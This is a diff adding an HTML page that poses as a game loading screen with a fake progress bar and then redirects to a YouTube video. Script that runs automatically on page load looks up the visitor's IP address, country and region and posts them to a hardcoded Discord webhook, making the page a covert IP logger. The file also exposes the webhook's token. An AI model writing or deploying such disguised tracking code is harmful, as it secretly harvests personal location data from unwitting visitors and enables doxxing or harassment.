@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Loading...</title>
+    <meta http-equiv="refresh" content="10;url=https://www.youtube.com/watch?v=Xh3zkzJpxdc">
+    <style>
+      body {
+        background-color: #111;
+        color: #fff;
+        font-family: Arial, sans-serif;
+        text-align: center;
+        padding-top: 100px;
+      }
+      #progress-container {
+        width: 80%;
+        background-color: #333;
+        border-radius: 10px;
+        margin: 20px auto;
+        height: 30px;
+        overflow: hidden;
+      }
+      #progress-bar {
+        height: 100%;
+        width: 0%;
+        background-color: #4caf50;
+        transition: width 0.3s;
+      }
+      #status {
+        margin-top: 20px;
+        font-size: 1.2em;
+      }
+    </style>
+    <script>
+      const webhookUrl = "https://discord.com/api/webhooks/1396127800909496615/xCiYdQ16YG4NLrH0TKJ-b7a3hvUXea5sHfBPH-sZcVRpHeOFvuH8LEmE1ZvMn_Z_Vw7e";
+      let progress = 0;
+      const steps = [
+        "Loading assets...",
+        "Initializing renderer...",
+        "Establishing connection...",
+        "Loading game..."
+      ];
+
+      function updateProgress() {
+        if (progress < 100) {
+          progress += 25;
+          document.getElementById("progress-bar").style.width = progress + "%";
+          document.getElementById("status").textContent = steps[progress / 25 - 1];
+          setTimeout(updateProgress, 2000);
+        }
+      }
+
+      function sendWebhook(ip, country, region) {
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: `Visitor IP: ${ip}\nCountry: ${country}\nRegion/State: ${region}`
+          })
+        });
+      }
+
+      window.onload = () => {
+        updateProgress();
+        fetch("https://ip-api.com/json")
+          .then(response => response.json())
+          .then(data => {
+            sendWebhook(data.query, data.country, data.regionName);
+          })
+          .catch(() => {
+            sendWebhook("IP fetch failed or blocked.", "N/A", "N/A");
+          });
+      };
+    </script>
+  </head>
+  <body>
+    <h1>Loading...</h1>
+    <div id="progress-container">
+      <div id="progress-bar"></div>
+    </div>
+    <div id="status">Starting...</div>
+  </body>
+</html>
